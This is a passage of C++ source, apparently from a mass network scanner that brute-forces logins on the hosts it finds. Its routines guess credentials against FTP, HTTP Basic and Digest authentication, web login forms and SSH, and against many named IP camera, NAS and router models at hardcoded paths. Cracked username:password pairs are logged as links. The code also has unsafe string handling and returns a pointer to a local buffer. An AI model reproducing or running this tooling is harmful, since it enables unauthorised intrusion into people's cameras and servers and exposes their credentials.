	strcat(log, "</font></a>; Received: <font color=SteelBlue>");
	strcat(log, std::to_string((long double)recd).c_str());
	strcat(log, "</font>");
	
	if(flag == 666 || flag == 350)	
	{
		fillGlobalLogData(ip, hl, port, std::to_string((long double)recd).c_str(), finalstr, "", "", "", cp, "Strange error");
		++PieAnomC1;
		++AnomC1;
	}
	else if(flag == 0 || flag == 15 || flag == -10)
	{
		fillGlobalLogData(ip, hl, port, std::to_string((long double)recd).c_str(), finalstr, "", "", "", cp, "Anomaly");
		++PieAnomC1;
		++AnomC1;
	}
	else if(flag == 3)
	{
		fillGlobalLogData(ip, hl, port, std::to_string((long double)recd).c_str(), finalstr, "", "", "", cp, "Suspicious");
		++PieSusp;
		++Susp;
	}
	else if(flag == 7)				
	{
		fillGlobalLogData(ip, hl, port, std::to_string((long double)recd).c_str(), finalstr, "", "", "", cp, "Low load");
		++PieLowl;
	}
	else if(flag == 10)	
	{
		fillGlobalLogData(ip, hl, port, std::to_string((long double)recd).c_str(), finalstr, "", "", "", cp, "Login form");
		++PieWF;
	};

	if(flag != 6 && flag != 5 && flag != 4)
	{
		strcat(log, "; Title: <font color=GoldenRod>");

		strncat(log, QString::fromLocal8Bit(finalstr).toHtmlEscaped().toLocal8Bit().data(), 100);
		strcat(log, "</font>");
	};
	strcat(log, "\n");

	fputsf (ip, port, log, flag, msg);

	ZeroMemory(msg, strlen(msg));
};
void _specFillerBA(char *hl, char *ip, char *port, char *finalstr, char *login, char *pass, int flag)
{
	char log[512] = {0};
	
	++PieBA;
	
	strcpy(log, "[BA] ");
	strcat(log, "<a href=\"http://");
	strcat(log, login);
	strcat(log, ":");
	strcat(log, pass);
	strcat(log, "@");
	strcat(log, ip);
	strcat(log, port);
	strcat(log, "\"><font color=MediumSeaGreen>");
	strcat(log, login);
	strcat(log, ":");
	strcat(log, pass);
	strcat(log, "@");
	strcat(log, ip);
	strcat(log, port);
	strcat(log, "</font></a> Title: <font color=GoldenRod>");
	strcat(log, finalstr);
	strcat(log, "</font>");
	strcat(log, "\n");
#pragma region QTGUI_Area
	stt->doEmitionFoundData(QString::fromLocal8Bit(log));
#pragma endregion
	fputsf (ip, port, log , flag, "Basic Authorization");
};
void _specFillerWF(char *hl, char *ip, char *port, char *finalstr, char *login, char *pass, int flag)
{
	char log[512] = {0};
	
	++PieWF;
	
	strcpy(log, "[WF] ");
	strcat(log, "<a href=\"http://");
	strcat(log, ip);
	strcat(log, ":");
	strcat(log, port);
	strcat(log, "\"><font color=MediumSeaGreen>");
	strcat(log, ip);
	strcat(log, ":");
	strcat(log, port);
	strcat(log, "</font></a> Title: <font color=GoldenRod>");
	strcat(log, finalstr);
	strcat(log, "</font> Pass: <font color=SteelBlue>"); 
	strcat(log, login);
	strcat(log, ":");
	strcat(log, pass);
	strcat(log, "</font>");
	strcat(log, "\n");
#pragma region QTGUI_Area
	stt->doEmitionFoundData(QString::fromLocal8Bit(log));
#pragma endregion
	fputsf (ip, port, log , flag, "Web Form");
};
void _getFormVal(char *data, char *result, char *key)
{
	char parVal[256] = {0};
	int psz = 0;
	char *pkeyResult1 = strstr(data, ">");
	if(pkeyResult1 != NULL)
	{
		psz = pkeyResult1 - data + 1;
		strncpy(parVal, data, (psz < 256 ? psz : 256));
	}
	else
	{
		strncpy(parVal, data, 256);		
	};
	int sz = 0;
	char parVal2[256] = {0};

	char *keyResult1 = strstri(parVal, key);
	if(keyResult1 != NULL)
	{
		char *pkeyResult2 = FindFirstOcc(keyResult1, " >");
		if(pkeyResult2 != keyResult1)
		{
			int psz2 = pkeyResult2 - keyResult1;
			strncpy(parVal2, keyResult1, (psz2 < 256 ? psz2 : 256));

			char *keyResult2 = FindFirstOcc(parVal2, "'\"");
			if(keyResult2 != NULL && keyResult2 != parVal2)
			{
				char *keyResult3 = FindFirstOcc(keyResult2 + 1, "'\"> ");
				if(keyResult3 != NULL && keyResult3 != keyResult2)
				{
					sz = keyResult3 - keyResult2 - 1;
					strncpy(result, keyResult2 + 1, sz);
				};
			}
			else
			{
				keyResult2 = FindFirstOcc(parVal2, "=");
				if(keyResult2 != NULL && keyResult2 != parVal2)
				{
					char *keyResult3 = FindFirstOcc(keyResult2, "'\"> ");
					if(keyResult3 != keyResult2 )
					{
						sz = keyResult3 - keyResult2 - 1;
						strncpy(result, keyResult2 + 1, sz);
					}
					else
					{
						strcpy(result, keyResult2 + 1);					
					};
				}
			};

		}
		else
		{
			stt->doEmitionFoundData("[WF]: GetParam - Cannot localize field.");				
		};
	};
};

static const std::string arrUser[] = {"user", "usr", "username", "login", "lgn", "account", "acc", "param1", "param3", "id", "A1", "uname"};
vector<std::string> vecUser (arrUser, arrUser + sizeof(arrUser) / sizeof(arrUser[0]) );
static const std::string arrPass[] = {"pass", "pw", "password", "code", "param2", "param4", "secret", "login_p", "A2", "admin_pw", "pws"};
vector<std::string> vecPass (arrPass, arrPass + sizeof(arrPass) / sizeof(arrPass[0]) );

char *_getAttribute(char *str, char *attrib)
{
	if(strstri(str, attrib) != NULL)
	{
		char res[1024] = {0};
		char *ptrStart = strstri(str, attrib);
		char *ptrEnd = FindFirstOcc(ptrStart, "\r\n");
		int szAt = strlen(attrib);
		int sz = ptrEnd - ptrStart - szAt;

		if(sz != 0 && sz < 1024) strncpy(res, ptrStart + szAt, sz);
		else return "";

		return res;
	}
	else return "";
};
void _getInputVal(std::vector<std::string> inputVec, char *buff, char *key)
{
	char *pos = NULL;
	char field[128] = {0};
	if(strcmp(key, "USER") == 0)
	{
		for(int i = 0; i < inputVec.size(); ++i)
		{
			ZeroMemory(field, 128);
			_getFormVal((char*)inputVec[i].data(), field, "name=");
			for(int j = 0; j < vecUser.size(); ++j)
			{
				pos = strstri(field, vecUser[j].data());
				if(pos != NULL)
				{
					strncpy(buff, field, 128);
					return;
				};
			};
		};
	}
	else
	{
		for(int i = 0; i < inputVec.size(); ++i)
		{
			ZeroMemory(field, 128);
			_getFormVal((char*)inputVec[i].data(), field, "name=");
			for(int j = 0; j < vecPass.size(); ++j)
			{
				pos = strstri(field, vecPass[j].data());
				if(pos != NULL)
				{
					strncpy(buff, field, 128);
					return;
				};
			};
		};
	};
};
void _specWFBrute(char *ip, int port, char *hl, char *buff, int flag, char *path, char *comment, char *tclass, char *cp, int recd, char *title)
{
	char cookie[1024] = {0};

	if(strstr(buff, "VER_CODE") != NULL || strstri(buff, "captcha") != NULL)
	{
		if(gNegDebugMode)
		{
			stt->doEmitionDebugFoundData("[<a href=\"http://" + QString(ip) + ":" + QString::number(port) + "\"><font color=\"#0084ff\">" + QString(ip) + ":" + QString::number(port) + "</font></a>" + "] Ignoring: Captcha detected.");
		};
		return;
	};
	OnLiner = 1;

	char b[16] = {0};
	char methodVal[128] = {0};
	char actionVal[128] = {0};
	char userVal[128] = {0};
	char passVal[128] = {0};
	char frmBlock[4096] = {0};
	char *fBlock = strstri(buff, "<form ");
	char formVal[128] = {0};
	int fbsz = 0;
	std::vector<std::string> inputVec;
	if(fBlock != NULL)
	{
		char *fBlock2 = strstri(fBlock, ">");
		int szfb2 = fBlock2 - fBlock;
		strncpy(formVal, fBlock, (szfb2 < 128 ? szfb2 : 128));
		char *frmBlockEnd = strstri(fBlock, "</form>");
		if(frmBlockEnd != NULL)
		{
			fbsz = frmBlockEnd - fBlock;
			strncpy(frmBlock, fBlock, (fbsz < 4096 ? fbsz : 4096));
		}
		else
		{
			strncpy(frmBlock, fBlock, 4096);			
		};

		_getFormVal(frmBlock, methodVal, "method");
		_getFormVal(frmBlock, actionVal, "action");
		if(actionVal[0] == '.')
		{
			char tmpBuff[512] = {0};
			char *tempPtr1 = FindLastOcc(path, "/");
			int sz = tempPtr1 - path;
			if(sz > 0)
			{
				strncpy(tmpBuff, path, sz);
				strncat(tmpBuff, actionVal + 1, strlen(actionVal) - 1);
				ZeroMemory(actionVal, sizeof(actionVal));
				strcpy(actionVal, tmpBuff);
			};
		};

		char *inptPtr1 = strstri(frmBlock, "<input ");
		int insz = 0;
		char *inptPtrEnd = NULL;
		char tempInptStr[128] = {0};
		while(inptPtr1 != NULL)
		{
			inptPtrEnd = strstr(inptPtr1, ">");
			if(inptPtrEnd != NULL)
			{
				insz = inptPtrEnd - inptPtr1 + 1;
				strncpy(tempInptStr, inptPtr1, (insz < 128 ? insz : 128));
				if(strstri(tempInptStr, "text") != NULL || strstri(tempInptStr, "password") != NULL )
				{
					inputVec.push_back(std::string(tempInptStr));
				};
				inptPtr1 = strstri(inptPtrEnd, "<input ");
			}
			else break;
		};

		if(inputVec.size() != 0)
		{
			_getInputVal(inputVec, userVal, "USER");
			_getInputVal(inputVec, passVal, "PASS");
		}
		else
		{
			stt->doEmitionFoundData("<a href=\"http://" + QString(ip) + ":" + QString::number(port) + "\"><font color=\"#c3c3c3\">" + QString(ip) + ":" + QString::number(port) + "</font></a> - [WF]: No text/password fields found.");							
		};
	}
	else
	{
		stt->doEmitionFoundData("<a href=\"http://" + QString(ip) + ":" + QString::number(port) + "\"><font color=\"#c3c3c3\">" + QString(ip) + ":" + QString::number(port) + "</font></a> - [WF]: Cannot find form block.");
	};
	
	if(strlen(methodVal) == 0)
	{
		strcpy(methodVal, "GET");
	};
	if(strlen(actionVal) == 0)
	{
		strcpy(actionVal, "/");
	}
	else
	{
		if(strstri(actionVal, "http") != NULL)
		{
			char tmp[128] = {0};
			strncpy(tmp, actionVal, 128);
			if(strstr(tmp, "//") != NULL)
			{
				char *tmp1 = strstr(tmp, "//");
				char *tmp2 = strstr(tmp1 + 2, "/");
				ZeroMemory(actionVal, 128);
				if(tmp2 != NULL)
				{
					strncpy(actionVal, tmp2, strlen(tmp2));
				}
				else
				{
					strcpy(actionVal, "/");				
				};
			}
			else if(strstr(tmp, "%2f%2f") != NULL)
			{
				char *tmp1 = strstr(tmp, "%2f%2f");
				char *tmp2 = strstr(tmp1 + 6, "%2f");
				ZeroMemory(actionVal, 128);
				if(tmp2 != NULL)
				{
					strcpy(actionVal, "/");
					strncpy(actionVal, tmp2 + 3, strlen(tmp2) - 3);
				}
				else
				{
					strcpy(actionVal, "/");				
				};
			};			
		};
		if(actionVal[0] != '/')
		{
			char temp[128] = {0};
			strncpy(temp, actionVal, 128);
			strcpy(actionVal, "/");
			strncat(actionVal, temp, strlen(temp));
		};
	};

	if(inputVec.size() > 0)
	{
		char tport[16] = {0};
		strcpy(tport, itoa(port, b, 10));
		if(strlen(userVal) != 0 && strlen(passVal) != 0)
		{
			Connector con;
			lopaStr lps = con._WFLobby(cookie, ip, port, methodVal, actionVal, userVal, passVal, formVal);

			if(strstr(lps.login, "UNKNOWN") == NULL && strlen(lps.other) == 0) 
			{
				_specFillerWF(hl, ip, tport, title, lps.login, lps.pass, flag);
		
				fillGlobalLogData(ip, hl, tport, std::to_string((long double)recd).c_str(), title, lps.login, lps.pass, comment, cp, tclass);
				putInFile(flag, ip, tport, recd, title, hl, cp);
			};
		}
		else
		{
			stt->doEmitionFoundData("<a href=\"http://" + QString(ip) + ":" + QString::number(port) + "\"><font color=\"#c3c3c3\">" + QString(ip) + ":" + QString::number(port) + "</font></a> - [WF]: Cannot find user/pass field.");		
			fillGlobalLogData(ip, hl, tport, std::to_string((long double)recd).c_str(), title, "?", "?", "Unknown webform", cp, tclass);
			putInFile(flag, ip, tport, recd, title, hl, cp);
		};
	};
	OnLiner = 0;
};
void _specWEBIPCAMBrute(char *ip, int port, char *hl, char *finalstr, int flag, char *comment, char *tclass, char *cp, int recd, char *SPEC)
{
	lopaStr lps;
	ZeroMemory(lps.login, sizeof(lps.login));
	ZeroMemory(lps.pass, sizeof(lps.pass));
	ZeroMemory(lps.other, sizeof(lps.other));
	char tport[32] = {0};
	char b[16] = {0};
	strcpy(tport, ":");
	strcat(tport, itoa(port, b, 10));
	Connector con;
	lps = con._IPCameraBLobby(ip, port, SPEC);

	if(strstr(lps.login, "UNKNOWN") == NULL && strlen(lps.other) == 0) 
	{
		_specFillerBA(hl, ip, tport, finalstr, lps.login, lps.pass, flag);

		fillGlobalLogData(ip, hl, tport, std::to_string((long double)recd).c_str(), finalstr, lps.login, lps.pass, comment, cp, "Basic Authorization");	
	};
};
void _specBrute(char *ip, int port, char *hl, char *finalstr, int flag, char *path, char *comment, char *tclass, char *cp, int recd, char *data)
{
	OnLiner = 1;
	lopaStr lps;
	ZeroMemory(lps.login, sizeof(lps.login));
	ZeroMemory(lps.pass, sizeof(lps.pass));
	ZeroMemory(lps.other, sizeof(lps.other));
	char temp[64] = {0};
	char tport[32] = {0};
	char b[16] = {0};
	strcpy(tport, ":");
	strcat(tport, itoa(port, b, 10));
	Connector con;

	if(strcmp(comment, "[DIGEST]") == 0) lps = con._BALobby(ip, port, path, "[DIGEST]", data);
	else lps = con._BALobby(ip, port, path, "[NORMAL]", "");

	if(strstr(lps.login, "UNKNOWN") == NULL && strlen(lps.other) == 0) 
	{
		_specFillerBA(hl, ip, tport, finalstr, lps.login, lps.pass, flag);

		fillGlobalLogData(ip, hl, tport, std::to_string((long double)recd).c_str(), finalstr, lps.login, lps.pass, comment, cp, "Basic Authorization");
		
	};

	ZeroMemory(temp, strlen(temp));
};
const char *GetTitle(char* str)
{
	char delimiterT[] = "<title id=titletext>";
	char delimiterT2[] = "<title id=\"title\">";
	char *firstStr, *secondStr, finalstr[512] = {0};
	
	if (strstri(str, "realm") != NULL)	
	{
		if (strstr(str, "\"") != NULL) 
		{
			int hm;
			firstStr = strstr(str, "\"");
			if(strstr((firstStr+1), "\"") != NULL) 
			{
				secondStr = strstr((firstStr+1), "\"");
				hm = (int)(secondStr-firstStr);
			}
			else hm = 10;
			if(hm > 127) hm = 20;
			strncat(finalstr, firstStr, hm+1);
		};
	};

	if(strlen(finalstr) != 0) strcat(finalstr, "::");

	if(strstri(str, "<card") != NULL)
	{
		char *str1 = strstri(str, "<card");
		if(strstri(str1, "title=") != NULL)
		{
			char *str2 = strstri(str1, "title=");
			if(strstri(str2, ">") != NULL)
			{
				char *str3 = strstri(str2, ">");

				int y = str3 - str2;
				if(y > 256)
				{ 
					strcpy(finalstr, "[Title: Strange title]");
				}
				else
				{
					strncat(finalstr, (char*)(str2 + strlen("title=")), y);
					strcat(finalstr, " += ");
				};
			};
		};
	};

	if(strstri(str, "<title>") != NULL) 
	{  
		if(strstri(str, "<title>") != NULL) firstStr = strstri(str, "<title>");
		if(strstri(firstStr, "</title>") != NULL) secondStr = strstri(firstStr, "</title>");
		else 
		{
			strcat(finalstr, "[Title: Corrupted title]");
			return finalstr;
		};
		int hm = (int)(secondStr - firstStr);
		if(hm > 256) hm = 20;
		strncat(finalstr, firstStr + 7, hm - 7);

		if(strstri(finalstr, "index of /") != NULL)
		{
			int hm = 0;
			strcat(finalstr, " (");
			if(strstri(firstStr, "description") != NULL) firstStr = strstri(firstStr, "description");
			if(strstri(firstStr, "<a href=") != NULL) firstStr = strstri(firstStr, "<a href=");
			else firstStr = NULL;
			int iterCount = 0;
			while(firstStr != NULL && strstr(firstStr , "\">") != NULL && strlen(finalstr) < 480) 
			{
				if(iterCount++ > 4 || strlen(finalstr) > 300) break;
				if(strstr(firstStr, "\">") != NULL) firstStr = strstr(firstStr, "\">");
				else break;
				secondStr = strstri(firstStr, "</a>");
				
				hm = (int)(secondStr-firstStr);
				if(hm > 16) hm = 16;

				strncat(finalstr, firstStr + 2, hm - 2);
				strcat(finalstr, " ");
				if(strstri(firstStr, "<a href=") != NULL) firstStr = strstri(firstStr, "<a href=");
				else break;
			};

			strcat(finalstr, ");");
		};
	};

	if(strstri(str, delimiterT2) != NULL) 
	{ 
		firstStr = strstri(str, delimiterT2);
		if(strstri(firstStr, "</title>") != NULL) secondStr = strstri(firstStr, "</title>");
		else
		{
			strcpy(finalstr, "[Title: Corrupted title]");
			return finalstr;
		};
		int hm = (int)(secondStr-firstStr);
		if(hm > 127) hm = 30;
		strncat(finalstr, firstStr+18, hm-18);
	}
	else if(strstri(str, delimiterT) != NULL) 
	{  
		firstStr = strstri(str, delimiterT);
		if(strstri(firstStr, "</title>") != NULL) secondStr = strstri(firstStr, "</title>");
		int hm = (int)(secondStr-firstStr);
		if(hm > 127) hm = 30;
		strncat(finalstr, firstStr+20, hm-20);
	};

	return finalstr;
};
int Lexems::_filler(int p, char* buffcpy, char* ip, int recd, Lexems *lx, char *hl)		
{
	char b[16] = {0};
	
	if(	strstr(buffcpy, "[IGNR_ADDR]") != NULL ) return -1;
	if(strstri(buffcpy, "404 not found") != NULL || strstri(buffcpy, "404 file not found") != NULL)	
	{
		if(gNegDebugMode)
		{
			stt->doEmitionDebugFoundData("[<a href=\"http://" + QString(ip) + "\"><font color=\"#0084ff\">" + QString(ip) + "</font></a>" + "] Negative hit: \"" + QString::fromLocal8Bit("404 Not Found").toHtmlEscaped() + "\"");
		};
		++Filt;
		return -1;
	};
	if(p == 22)
	{
		flag = -22;
		char log[2048] = {0};
		char logEmit[2048] = {0};
		char goodStr[256] = {0};
		char banner[256] = {0};

		char *ptr1 = strstr(buffcpy, "|+|");
		int gsz = ptr1 - buffcpy;
		strncpy(goodStr, buffcpy, gsz);
		if(strlen(ptr1 + 3) > 0) strcpy(banner, ptr1 + 3);
		strcpy(logEmit, "[SSH] ");
		strcpy(log, "[SSH] <font color=\"#00a8ff\">");
		strcat(log, goodStr);
		strcat(log, "</font>");
		strcat(log, "<font color=\"#323232\">; Banner:</font> <font color=\"#9cff00\">");
		strcat(log, banner);
		strcat(log, "</font>");
		
			++PieSSH;

			strcat(logEmit, "<span style=\"color: #00a8ff;\">");
			strcat(logEmit, goodStr);
			strcat(logEmit, "</span>");

			fputsf (ip, itoa(p, b, 10), log, flag, "SSH");
	
			char loginSSH[128] = {0};
			char passSSH[128] = {0};
			char *ptrl1 = strstr(buffcpy, ":");
			int lpsz = ptrl1 - buffcpy;
			strncpy(loginSSH, buffcpy, lpsz);
			char *ptrl2 = strstr(buffcpy, "@");
			lpsz = ptrl2 - ptrl1;
			strncpy(passSSH, ptrl1 + 1, lpsz);
			fillGlobalLogData(ip, hl, itoa(p, b, 10), std::to_string((long double)recd).c_str(), "[SSH service]", loginSSH, passSSH, "NULL", "UTF-8", "SSH");
			

#pragma region QTGUI_Area
			stt->doEmitionFoundData(QString::fromLocal8Bit(logEmit));
#pragma endregion
	};
	lopaStr lps;		
	PathStr ps;
	strcpy(ps.ip, ip);
	ZeroMemory(ps.headr, sizeof(ps.headr));
	ZeroMemory(ps.path, sizeof(ps.path));
	ZeroMemory(lps.login, sizeof(lps.login));
	ZeroMemory(lps.pass, sizeof(lps.pass));
	ZeroMemory(lps.other, sizeof(lps.other));
	char finalstr[TITLE_MAX_LENGTH] = {0};
	char cp[32] = {0};
	strcpy(cp, "utf-8");	
	char port[32] = {0};
	strcpy(port, itoa(p, b, 10));
	int flag = 0;

	flag = ContentFilter(buffcpy, p, ip);

	if(flag == -1 ) return -1;
	
	strcpy(ps.headr, GetTitle(buffcpy));
	ps.flag = flag;
	char pps[256] = {0};
	strcpy(pps, "/");

	std::vector<std::string> redirStrLst;
	char rBuff[65536] = {0};
	strncpy(rBuff, buffcpy, 65535);
	if(flag == 0 || flag == 3 || flag == 7 )
	{
		int rh = _header(ip, p, buffcpy, lx, &ps, &redirStrLst, rBuff);
		strcpy(cp, ps.codepage);
		if(rh <= -2) 
		{
			flag = ps.flag;
			strcat(finalstr, ps.headr);
			p = ps.port;
			strcpy(ip, ps.ip);
		};
		
		int sz = strlen(ps.path);
		strncpy(pps, ps.path, (sz < 256 ? sz : 256));
	};
	if(strlen(finalstr) != 0) strcat(finalstr, " -> ");
	if(strstr(finalstr, ps.headr) == NULL) strcat(finalstr, ps.headr);
	if(strstr(finalstr, "Error - Bad Address") != NULL) flag = 5;
	else if(flag == -1 || flag == 6 || strstr(finalstr, "[IGNR_ADDR]") != NULL) return -1;

	fillerFlag = 1;
#pragma region Fillers

	if(flag == 16) 
	{
		Connector con;
		OnLiner = 1;

		char log[2048] = {0};
		char logEmit[2048] = {0};

		strcpy(logEmit, "[FTP] ");
		strcpy(log, "[FTP] <font color=\"#0f62e2\">");
		strcat(log, ip);
		strcat(log, port);
		strcat(log, "</font>");
		strcat(log, "; Received: ");
		strncat(log, std::to_string((long double)recd).c_str(), 100);
				
		BConInc();
		lps = con._ftpBrute(ip, p, &ps);
		BConDec();

		if(strstr(lps.other, "ROUTER") != NULL)
		{
			++PieBA;
			strcat(log, "<a href=\"ftp://");
			strcat(log, lps.login);
			strcat(log, ":");
			strcat(log, lps.pass);
			strcat(log, "@");
			strcat(log, ip);
			strcat(log, "/\"><span style=\"color: #ff6600;\">ftp://");
			strcat(log, lps.login);
			strcat(log, ":");
			strcat(log, lps.pass);
			strcat(log, "@");
			strcat(log, ip);
			strcat(log, "</span></a> <font color=\"#43EC00\"><a href=\"http://");
			strcat(log, ip);
			strcat(log, "\" style=\"color:#43EC00;\">[ROUTER]</a></font>");
			strcat(log, ps.headr);

			strcat(logEmit, "<a href=\"ftp://");
			strcat(logEmit, lps.login);
			strcat(logEmit, ":");
			strcat(logEmit, lps.pass);
			strcat(logEmit, "@");
			strcat(logEmit, ip);
			strcat(logEmit, "/\"><span style=\"color: #ff6600;\">ftp://");
			strcat(logEmit, lps.login);
			strcat(logEmit, ":");
			strcat(logEmit, lps.pass);
			strcat(logEmit, "@");
			strcat(logEmit, ip);
			strcat(logEmit, "</span></a> <font color=\"#43EC00\"><a href=\"http://");
			strcat(logEmit, ip);
			strcat(logEmit, "/\" style=\"color:#43EC00;\">[ROUTER]</a></font>");
			
			fputsf (ip, port, log, flag, "FTP");
	
			fillGlobalLogData(ip, hl, port, std::to_string((long double)recd).c_str(), "[FTP service]", lps.login, lps.pass, "Router FTP detected.", cp, "FTP");
			

			#pragma region QTGUI_Area
			stt->doEmitionFoundData(QString::fromLocal8Bit(logEmit));
#pragma endregion
		}
		else if(strstr(lps.login, "UNKNOWN") == NULL && strlen(lps.other) == 0) 
		{
			++PieBA;
			strcat(log, "<a href=\"ftp://");
			strcat(log, lps.login);
			strcat(log, ":");
			strcat(log, lps.pass);
			strcat(log, "@");
			strcat(log, ip);
			strcat(log, "/\"><span style=\"color: #ff6600;\">ftp://");
			strcat(log, lps.login);
			strcat(log, ":");
			strcat(log, lps.pass);
			strcat(log, "@");
			strcat(log, ip);
			strcat(log, "</span></a>");
			strcat(log, ps.headr);

			strcat(logEmit, "<a href=\"ftp://");
			strcat(logEmit, lps.login);
			strcat(logEmit, ":");
			strcat(logEmit, lps.pass);
			strcat(logEmit, "@");
			strcat(logEmit, ip);
			strcat(logEmit, "/\"><span style=\"color: #ff6600;\">ftp://");
			strcat(logEmit, lps.login);
			strcat(logEmit, ":");
			strcat(logEmit, lps.pass);
			strcat(logEmit, "@");
			strcat(logEmit, ip);
			strcat(logEmit, "</span></a>");

			fputsf(ip, port, log, flag, "FTP");
	
			fillGlobalLogData(ip, hl, port, std::to_string((long double)recd).c_str(), "[FTP service]", lps.login, lps.pass, "NULL", cp, "FTP");
			

#pragma region QTGUI_Area
			stt->doEmitionFoundData(QString::fromLocal8Bit(logEmit));
#pragma endregion
		}
		else if(strstr(lps.login, "Unknown protocol") != NULL) 
		{
			strcat(log, "; [!] USER/PASS commands failed. Dunno what to do.");
			fputsf(ip, port, log, flag, "");

#pragma region QTGUI_Area
			stt->doEmitionFoundData(QString::fromLocal8Bit(log));
#pragma endregion
		};
	}
	else if(flag == 21) //Eyeon
	{
		_specBrute(ip, p, hl, "Eyeon Camera", flag, "/user/index.htm", "Eyeon Camera", "Basic Authorization", cp, recd, "");
	}
	else if(flag == 22) //IP Camera control
	{
		_specBrute(ip, p, hl, "IP camera Control webpage", flag, "/main/cs_motion.asp", "IP Camera Control", "Basic Authorization", cp, recd, "");
	}
	else if(flag == 23) //Network Camera BB-SC384
	{
		_specBrute(ip, p, hl, "Network Camera BB-SC384", flag, "/live/index2.html", "Network Camera BB-SC384", "Basic Authorization", cp, recd, "");
	}
	else if(flag == 24) //Network Camera VB-M40
	{
		_specBrute(ip, p, hl, "Network Camera VB-M40", flag, "/-wvhttp-01-/open.cgi?", "Network Camera VB-M40", "Basic Authorization", cp, recd, "");
	}
	else if(flag == 25) //Panasonic WTFISTHISAreaOMGIDONTEVEN-camera
	{
		_specBrute(ip, 60002, hl, "Panasonic WTFISTHISAreaOMGIDONTEVEN-camera", flag, "/SnapshotJPEG", "Panasonic WTFISTHISAreaOMGIDONTEVEN-camera", "Basic Authorization", cp, recd, "");
	}
	else if(flag == 26) //Sony Network Camera
	{
		_specBrute(ip, p, hl, "Sony Network Camera", flag, "/oneshotimage?", "Sony Network Camera", "Basic Authorization", cp, recd, "");
	}
	else if(flag == 27) //UA Network Camera
	{
		_specBrute(ip, p, hl, "UA Network Camera", flag, "/webs.cgi?", "UA Network Camera", "Basic Authorization", cp, recd, "");
	}
	else if(flag == 28) //Network Camera VB-M40
	{
		_specBrute(ip, p, hl, "Network Camera VB-??", flag, "/-wvhttp-01-/open.cgi?", "Network Camera VB-??", "Basic Authorization", cp, recd, "");
	}
	else if(flag == 29) //LG Smart IP Device
	{
		_specBrute(ip, p, hl, "LG Smart IP Device Camera", flag, "/digest.php", "LG Smart IP Device Camera", "Basic Authorization", cp, recd, "");
	}
	else if(flag == 30) //NAS
	{
		_specBrute(ip, p, hl, "NAS", flag, "/cgi-bin/data/viostor-220/viostor/viostor.cgi", "NAS", "Basic Authorization", cp, recd, "");
	}
	else if(flag == 31) //ip cam
	{
		_specBrute(ip, p, hl, "IP CAMERA", flag, "/check_user.cgi", "IP CAMERA", "Basic Authorization", cp, recd, "");
	}
	else if(flag == 32) //IPC WEB ip cam
	{
		_specWEBIPCAMBrute(ip, p, hl, "[IPC] WEB IP CAMERA", flag, "[IPC] WEB IP CAMERA", "WEB Authorization", cp, recd, "IPC");
	}
	else if(flag == 33) //GEOvision ip cam
	{
		_specWEBIPCAMBrute(ip, p, hl, "[GEO] WEB IP CAMERA", flag, "[GEO] WEB IP CAMERA", "WEB Authorization", cp, recd, "GEO");
	}
	else if(flag == 20) //AXIS Camera
	{
		_specBrute(ip, p, hl, "AXIS Camera", flag, "/axis-cgi/com/ptz.cgi?", "AXIS Camera", "Basic Authorization", cp, recd, "");
	}
	else if(flag == 19) //reecam cameras
	{
		_specBrute(ip, p, hl, "Reecam (network camera)", flag, "/videostream.cgi", "ReeCam camera", "Basic Authorization", cp, recd, "");
	}
	else if(flag == 18) //linksys camera
	{
		_specBrute(ip, p, hl, "Linksys camera", flag, "/img/main.cgi", "Linksys camera", "Basic Authorization", cp, recd, "");
	}
	else if(flag == 17) //Real-time IP Camera Monitoring System
	{
		_specBrute(ip, p, hl, "Real-time IP Camera Monitoring System", flag, "/live.htm", "Real-time IP Camera", "Basic Authorization", cp, recd, "");
	}
	else if(flag == 11) 
	{
		_specBrute(ip, p, hl, "Netwave IP Camera", flag, "/videostream.cgi", "Netwave IP Camera", "Basic Authorization", cp, recd, "");
	}
	else if(flag == 12) 
	{
		_specBrute(ip, p, hl, "IP Camera", flag, "/view/view.shtml?videos=", "IP Camera", "Basic Authorization", cp, recd, "");
	}
	else if(flag == 13) 
	{
		_specBrute(ip, p, hl, "IP Camera", flag, "/eng/view/indexjava.html", "IP Camera", "Basic Authorization", cp, recd, "");
	}
	else if(flag == 14) 
	{
		_specBrute(ip, p, hl, "IP Camera", flag, "/rdr.cgi", "IP Camera", "Basic Authorization", cp, recd, "");
	}
	else if(flag == 15) //For HFS
	{
		char temp[64] = {0};
		char log[512] = {0};
		Connector con;
		OnLiner = 1;
		++AnomC1;
		
		strcpy(log, "[HFS] <font color=\"#ff6600\">");
		strcat(log, hl);
		strcat(log, " :: </font><a href=\"http://");
		strcat(log, ip);
		strcat(log, port);
		strcat(log, "/\"><span style=\"color: #a1a1a1;\">");
		strcat(log, ip);
		strcat(log, port);
		strcat(log, "</span></a><font color=\"#0084ff\"> Title: </font><font color=\"#ff9600\">");
		strcat(log, finalstr);
		strcat(log, " Pass: "); 
		lps = con._BALobby(ip, p, "/~login", "[NORMAL]", "");
		strcat(log, lps.login);
		strcat(log, ":");
		strcat(log, lps.pass);
		strcat(log, "</font>");


		fillGlobalLogData(ip, hl, port, std::to_string((long double)recd).c_str(), finalstr, lps.login, lps.pass, "HFS-FTP", cp, "Basic Authorization");
		

		fputsf (ip, port, log , flag, "HFS");
#pragma region QTGUI_Area
		stt->doEmitionFoundData(QString::fromLocal8Bit(log));
#pragma endregion
		ZeroMemory(temp, strlen(temp));
	}
	else if(flag == 1) 
	{
		_specBrute(ip, p, hl, finalstr, flag, pps, "[NORMAL]", "Basic Authorization", cp, recd, "");
	}
	else if(flag == 101) 
	{
		_specBrute(ip, p, hl, finalstr, flag, pps, "[DIGEST]", "Basic Authorization", cp, recd, buffcpy);
	}
	else if(flag == 10) 
	{
		_specWFBrute(ip, p, hl, rBuff, flag, pps, "Web Form", "Web Form", cp, recd, finalstr);
	}
	else 
	{
		putInFile(flag, ip, port, recd, finalstr, hl, cp);
	};
#pragma endregion
	fillerFlag = 0;

	return flag;
};
int redirectReconnect(char *cookie, char *ip, int port, char *str, Lexems *ls, PathStr *ps, std::vector<std::string> *redirStrLst, char *buff)
{
	if(ls->iterationCount++ == 5)
	{	
		ls->iterationCount = 0;

		strcpy(ps->headr, "[!][Loop detected.]");
		strcpy(ps->path, "");

		return 0;
	};

	const char *buff1 = "GET ";
	const char *buff2 = " HTTP/1.1\r\nHost: ";
	const char *buff3 = "\r\nCookie:";
